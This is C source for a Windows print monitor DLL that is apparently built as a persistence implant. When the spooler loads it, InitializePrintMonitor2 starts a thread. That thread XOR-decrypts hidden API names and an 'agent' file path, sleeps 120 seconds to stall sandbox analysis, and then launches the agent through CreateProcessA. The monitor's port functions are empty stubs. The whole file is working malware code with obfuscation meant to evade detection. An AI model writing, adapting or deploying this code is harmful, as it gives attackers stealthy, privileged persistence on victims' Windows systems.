#include <windows.h>
#include <winspool.h>

#define HKEYMONITOR HKEY

// https://ntdoc.m417z.com/ntdelayexecution
typedef NTSTATUS ( NTAPI * NtDelayExecution_t ) (
    BOOLEAN        Alertable,
    PLARGE_INTEGER DelayInterval
);

typedef BOOL ( WINAPI * CreateProcessA_t ) (
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation 
);

typedef HANDLE ( WINAPI * CreateThread_t) (
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    LPVOID                  lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
);

// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/winsplp/ns-winsplp-_monitorreg
typedef struct _MONITORREG {
    DWORD cbSize;
    LONG( *fpCreateKey )( HKEYMONITOR hcKey, LPCTSTR pszSubKey, DWORD dwOptions, REGSAM samDesired, PSECURITY_ATTRIBUTES pSecurityAttributes, HKEYMONITOR *phckResult, PDWORD pdwDisposition, HANDLE hSpooler);
    LONG( *fpOpenKey )( HKEYMONITOR hcKey, LPCTSTR pszSubKey, REGSAM samDesired, HKEYMONITOR *phkResult, HANDLE hSpooler);
    LONG( *fpCloseKey )( HKEYMONITOR hcKey, HANDLE hSpooler);
    LONG( *fpDeleteKey )( HKEYMONITOR hcKey, LPCTSTR pszSubKey, HANDLE hSpooler);
    LONG( *fpEnumKey )( HKEYMONITOR hcKey, DWORD dwIndex, LPTSTR pszName, PDWORD pcchName, PFILETIME pftLastWriteTime, HANDLE hSpooler);
    LONG( *fpQueryInfoKey )( HKEYMONITOR hcKey, PDWORD pcSubKeys, PDWORD pcbKey, PDWORD pcValues, PDWORD pcbValue, PDWORD pcbData, PDWORD pcbSecurityDescriptor, PFILETIME pftLastWriteTime, HANDLE hSpooler);
    LONG( *fpSetValue )( HKEYMONITOR hcKey, LPCTSTR pszValue, DWORD dwType, const BYTE *pData ,DWORD cbData, HANDLE hSpooler);
    LONG( *fpDeleteValue )( HKEYMONITOR hcKey, LPCTSTR pszValue, HANDLE hSpooler);
    LONG( *fpEnumValue )( HKEYMONITOR hcKey, DWORD dwIndex, LPTSTR pszValue, PDWORD pcbValue,PDWORD pTyp, PBYTE pData, PDWORD pcbData, HANDLE hSpooler);
    LONG( *fpQueryValue )( HKEYMONITOR hcKey, LPCTSTR pszValue, PDWORD pType, PBYTE pData, PDWORD pcbData, HANDLE hSpooler);
} MONITORREG, *PMONITORREG;

// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/winsplp/ns-winsplp-_monitorinit
typedef struct _MONITORINIT {
    DWORD       cbSize;
    HANDLE      hSpooler;
    HKEYMONITOR hckRegistryRoot;
    PMONITORREG pMonitorReg;
    BOOL        bLocal;
    LPCWSTR     pszServerName;
} MONITORINIT, *PMONITORINIT;

// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/winsplp/ns-winsplp-_monitor2
typedef struct _MONITOR2 {
    DWORD  cbSize;
    BOOL( *pfnEnumPorts )( HANDLE hMonitor, LPWSTR pName, DWORD Level, LPBYTE pPorts, DWORD cbBuf, LPDWORD pcbNeeded, LPDWORD pcReturned);
    BOOL( *pfnOpenPort )( HANDLE hMonitor, LPWSTR pName, PHANDLE pHandle);
    BOOL( *pfnOpenPortEx )( HANDLE hMonitor, HANDLE hMonitorPort, LPWSTR pPortName, LPWSTR pPrinterName, PHANDLE pHandle, struct _MONITOR2* pMonitor2);
    BOOL( *pfnStartDocPort )( HANDLE hPort, LPWSTR pPrinterName, DWORD JobId, DWORD Level, LPBYTE pDocInfo);
    BOOL( *pfnWritePort )( HANDLE hPort, LPBYTE pBuffer, DWORD cbBuf, LPDWORD pcbWritten );
    BOOL( *pfnReadPort )( HANDLE hPort, LPBYTE pBuffer, DWORD cbBuffer, LPDWORD pcbRead);
    BOOL( *pfnEndDocPort )( HANDLE hPort );
    BOOL( *pfnClosePort )( HANDLE hPort );
    BOOL( *pfnAddPort )( HANDLE hMonitor, LPWSTR pName, HWND hWnd, LPWSTR pMonitorName );
    BOOL( *pfnAddPortEx )( HANDLE hMonitor, LPWSTR pName, DWORD Level, LPBYTE lpBuffer, LPWSTR lpMonitorName);
    BOOL( *pfnConfigurePort )( HANDLE hMonitor, LPWSTR pName, HWND hWnd, LPWSTR pPortName );
    BOOL( *pfnDeletePort )( HANDLE hMonitor, LPWSTR pName, HWND hWnd, LPWSTR pPortName);
    BOOL( *pfnGetPrinterDataFromPort )( HANDLE hPort, DWORD ControlID, LPWSTR pValueName, LPWSTR lpInBuffer, DWORD cbInBuffer, LPWSTR lpOutBuffer, DWORD cbOutBuffer, LPDWORD lpcbReturned);
    BOOL( *pfnSetPortTimeOuts )( HANDLE hPort, LPCOMMTIMEOUTS lpCTO, DWORD reserved);
    BOOL( *pfnXcvOpenPort )( HANDLE hMonitor, LPCWSTR pszObject, ACCESS_MASK GrantedAccess, PHANDLE phXcv );
    DWORD( *pfnXcvDataPort )( HANDLE hXcv, LPCWSTR pszDataName, PBYTE pInputData, DWORD cbInputData, PBYTE pOutputData, DWORD cbOutputData, PDWORD pcbOutputNeeded );
    BOOL( *pfnXcvClosePort )( HANDLE hXcv );
    VOID( *pfnShutdown )( HANDLE hMonitor );
    DWORD( *pfnSendRecvBidiDataFromPort )( HANDLE hPort, DWORD dwAccessBit, LPCWSTR pAction, PBIDI_REQUEST_CONTAINER pReqData, PBIDI_RESPONSE_CONTAINER *ppResData);
    DWORD( *pfnNotifyUsedPorts )( HANDLE hMonitor, DWORD cPorts, PCWSTR *ppszPorts );
    DWORD( *pfnNotifyUnusedPorts )( HANDLE hMonitor, DWORD cPorts, PCWSTR *ppszPorts );
    DWORD( *pfnPowerEvent )( HANDLE hMonitor, DWORD event, POWERBROADCAST_SETTING *pSettings );
} MONITOR2, *PMONITOR2, *LPMONITOR2;

void XORDecrypt( char * data, size_t data_len, char * key, size_t key_len ) {
    int j = 0;
    
    for ( int i = 0; i < data_len; i++ ) {
        data[i] = data[i] ^ key[j];
        
        j++;
        if ( j >= key_len ) 
            j = 0;
    }
}

// Entry point to a DLL
BOOL WINAPI DllMain( 
    HINSTANCE hinstDLL,     // Handle to DLL module
    DWORD fdwReason,        // Reason for calling function
    LPVOID lpReserved       // Reserved
) {
    // Perform actions based on the reason for calling
    switch ( fdwReason ) {
		case DLL_PROCESS_ATTACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
		}
	return TRUE;
}

void Go( void ) {
    
    STARTUPINFO         si = { sizeof( STARTUPINFO ) };
    PROCESS_INFORMATION pi;

    char xorkey[]              = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x31, 0x32, 0x33, 0x34 };
    char sNTDLL[]              = { 0xf, 0x16, 0x7, 0x8, 0x9, 0x46 };
    char sNtDelayExecution[]   = { 0xf, 0x36, 0x7, 0x21, 0x29, 0x27, 0x3e, 0x74, 0x4a, 0x56, 0x57, 0x34, 0x36, 0x2a, 0x2b, 0x2b, 0x46 };
    char sCreateProcessA[]     = { 0x2, 0x30, 0x26, 0x25, 0x31, 0x23, 0x17, 0x43, 0x5d, 0x50, 0x51, 0x32, 0x31, 0x2, 0x44 };
    char sKERNEL32[]           = { 0xa, 0x7, 0x11, 0xa, 0x0, 0xa, 0x74, 0x3, 0x1c, 0x77, 0x78, 0xd, 0x42 };
    char sAgentPath[]          = { 0x2, 0x78, 0x1f, 0x11, 0x36, 0x23, 0x35, 0x42, 0x6e, 0x52, 0x50, 0x2c, 0x2b, 0x2d, 0x2d, 0x36, 0x32, 0x35, 0x50, 0x46, 0x5c, 0x46, 0x1d, 0x6, 0x26, 0x37, 0x2e, 0x32, 0x28, 0x41, 0x6e, 0x5a, 0x59, 0x31, 0x2e, 0x22, 0x2a, 0x31, 0x6b, 0x2e, 0x5f, 0x58, 0x56, 0x57, 0x35, 0x6c, 0x26, 0x3c, 0x20, 0x46 };

    XORDecrypt( (char *) sNTDLL,            sizeof( sNTDLL ),             (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sNtDelayExecution, sizeof( sNtDelayExecution ),  (char *) xorkey, sizeof( xorkey ) );
        
    NtDelayExecution_t pNtDelayExecution = (NtDelayExecution_t) GetProcAddress( GetModuleHandle( sNTDLL ), sNtDelayExecution );
    LARGE_INTEGER interval;
    // Sleep for 120 seconds: -(dwMilliseconds * 10000) = -(120000 * 10000)
    interval.QuadPart = -1200000000;
    // Initiate a sleep on the current thread
    pNtDelayExecution( FALSE,        // The sleep is not alertable
                       &interval );

    XORDecrypt( (char *) sAgentPath,      sizeof( sAgentPath ),      (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sCreateProcessA, sizeof( sCreateProcessA ), (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sKERNEL32,       sizeof( sKERNEL32 ),       (char *) xorkey, sizeof( xorkey ) );

    CreateProcessA_t pCreateProcessA = (CreateProcessA_t) GetProcAddress( GetModuleHandle( sKERNEL32 ), sCreateProcessA );

	// Execute the agent
    pCreateProcessA(
	    sAgentPath,   // Module to be executed
		"",           // Optional command line to be executed
        NULL,         // Optional pointer to SECURITY_ATTRIBUTES structure
        NULL,         // Optional pointer to SECURITY_ATTRIBUTES structure
        TRUE,         // Each inheritable handle in the calling process is inherited by the new process
        0,            // No process creation flags
        NULL,         // Optional pointer to the environment block for the new process
        NULL,         // Optional full path to the current directory for the process
		&si,          // Pointer to STARTUPINFO structure
        &pi           // Pointer to PROCESS_INFORMATION structure
    );

}

// Declaration functions
BOOL WINAPI pfnOpenPort( HANDLE hMonitor, LPWSTR pName, PHANDLE pHandle ) { 
    return TRUE; 
}

BOOL WINAPI OpenPortEx( HANDLE hMonitor, HANDLE hMonitorPort, LPWSTR pPortName, LPWSTR pPrinterName, PHANDLE pHandle, struct _MONITOR2 *pMonitor ) { 
    return TRUE; 
}

BOOL ( WINAPI pfnStartDocPort ) ( HANDLE hPort, LPWSTR pPrinterName, DWORD JobId, DWORD Level, LPBYTE pDocInfo ) { 
    return TRUE; 
}

BOOL WritePort( HANDLE hPort, LPBYTE pBuffer, DWORD cbBuf, LPDWORD pcbWritten ) { 
    return TRUE; 
}

BOOL ReadPort( HANDLE hPort, LPBYTE pBuffer, DWORD cbBuffer, LPDWORD pcbRead ) { 
    return TRUE; 
}

BOOL ( WINAPI pfnEndDocPort ) ( HANDLE hPort ) { 
    return TRUE; 
}

BOOL ClosePort( HANDLE hPort ) { 
    return TRUE; 
}

BOOL WINAPI XcvOpenPort( HANDLE hMonitor, LPCWSTR pszObject, ACCESS_MASK GrantedAccess, PHANDLE phXcv ) { 
    return TRUE; 
}

DWORD XcvDataPort( HANDLE hXcv, LPCWSTR pszDataName, PBYTE  pInputData, DWORD cbInputData, PBYTE  pOutputData, DWORD cbOutputData, PDWORD pcbOutputNeeded ) { 
    return ERROR_SUCCESS; 
}

BOOL XcvClosePort( HANDLE hXcv ) { 
    return TRUE; 
}

VOID ( WINAPI pfnShutdown ) ( HANDLE hMonitor ) { }

DWORD WINAPI pfnNotifyUsedPorts( HANDLE hMonitor, DWORD cPorts, PCWSTR *ppszPorts ) { 
    return ERROR_SUCCESS; 
}

DWORD WINAPI pfnNotifyUnusedPorts( HANDLE hMonitor, DWORD cPorts, PCWSTR *ppszPorts ) { 
    return ERROR_SUCCESS; 
}

DWORD WINAPI pfnPowerEvent( HANDLE hMonitor, DWORD event, POWERBROADCAST_SETTING *pSettings ) { 
    return ERROR_SUCCESS; 
}

// Initializes a print monitor for use with clustered print servers
LPMONITOR2 WINAPI InitializePrintMonitor2( PMONITORINIT pMonitorInit, PHANDLE phMonitor ) {    
    
    char xorkey[]        = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x31, 0x32, 0x33, 0x34 };
    char sKERNEL32[]     = { 0xa, 0x7, 0x11, 0xa, 0x0, 0xa, 0x74, 0x3, 0x1c, 0x77, 0x78, 0xd, 0x42 };
    char sCreateThread[] = { 0x2, 0x30, 0x26, 0x25, 0x31, 0x23, 0x13, 0x59, 0x40, 0x56, 0x55, 0x25, 0x42 };

    // CreateThread and pointer to the function work fine

    XORDecrypt( (char *) sKERNEL32,     sizeof( sKERNEL32 ),     (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sCreateThread, sizeof( sCreateThread ), (char *) xorkey, sizeof( xorkey ) );

    CreateThread_t pCreateThread = (CreateThread_t) GetProcAddress( GetModuleHandle( sKERNEL32 ), sCreateThread );
    
    // The new process is created in a separate thread
    pCreateThread( 0, 0, (LPTHREAD_START_ROUTINE) Go, 0, 0, 0 );
	
	static MONITOR2 mon = { 
        sizeof( MONITOR2 ), 
        NULL, 
        pfnOpenPort, 
        OpenPortEx, 
        pfnStartDocPort, 
        WritePort, 
        ReadPort, 
        pfnEndDocPort, 
        ClosePort, 
        NULL, 
        NULL, 
        NULL, 
        NULL, 
        NULL, 
        NULL, 
        XcvOpenPort, 
        XcvDataPort, 
        XcvClosePort, 
        pfnShutdown, 
        NULL, 
        pfnNotifyUsedPorts, 
        pfnNotifyUnusedPorts, 
        pfnPowerEvent 
    };
    
	return &mon;
}